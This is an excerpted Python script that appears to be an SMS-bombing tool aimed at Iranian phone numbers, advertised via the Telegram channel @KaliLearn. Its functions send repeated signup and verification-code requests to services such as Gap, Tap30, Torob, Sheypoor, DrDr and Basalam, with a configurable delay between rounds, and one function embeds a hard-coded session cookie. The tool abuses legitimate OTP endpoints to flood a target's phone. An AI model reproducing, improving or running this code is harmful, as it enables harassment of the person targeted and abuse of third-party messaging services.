...
def gap(phone):
    ...
    try:
        gapR = get(
            timeout=5,
            url='https://core.gap.im/v1/user/add.json?mobile=%2B{}'.format(
                phone.split('+')[1]
            ),
            headers=gapH
        ).text
...
def tap30(phone):
    ...
    try:
        tap30R = post(
            timeout=5, url='https://tap33.me/api/v2/user', headers=tap30H, json=tap30D
        ).json()
        if tap30R['result'] == 'OK':
...
def torob(phone):
    ...
    try:
        torobR = get(
            timeout=5,
            url=f"https://api.torob.com/a/phone/send-pin/?phone_number={phone}",
            headers=torobH
        ).json()
...
def sheypoor(phone):
    sheyporH = {
        ...
        'Cookie': 'plog=False; _lba=false; AMP_TOKEN=%24NOT_FOUND; ts=46f5e500c49277a72f267de92dd51238; track_id=22f97cea33f34e368e4b3edd23afd391; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_session_token=3f475c6e-f55b-0d29-de67-6cdc46bc6592; analytics_token=3cce634d-040a-baf3-fdd6-552578d672df; yektanet_session_last_activity=8/13/2020; _yngt=0bc37b56-6478-488b-c801-521f101259fd; _lbsa=false; _ga=GA1.2.1464689488.1597346921; _gid=GA1.2.1551213293.1597346921; _gat=1',
        'TE': 'Trailers'
    }
...
def sTrip(phone):
    ...
    sTripD = {
        ...
        'mobile_phone': '0' + phone.split('+98')[1],
        'country_code': '+98',
...
def drdr(phone):
    ...
    try:
        drdr = post(
            ...
            url=dru,
            headers=drh,
            params={'phoneNumber': phone, 'userType': 'PATIENT'}
        ).json()
...
def olgoo(phone):
    olD = {
        'contactInfo[mobile]': '0' + phone.split('+98')[1],
...
def basalam(phone):
    baJ = {
        'variables': {'mobile': '0' + phone.split('+98')[1]},
...
{y}Info:
    ...
    {g}[+] {y}TelegramChannel: {w}@KaliLearn
...
'''
    ...
    try:
        Time = float(
            input(
                f'{g}[?] {y}Enter Sleep Time Between Requests {g}[Defult=0.1] {r}- {w}'
            )
        )
    except ValueError:
        Time = 0.1
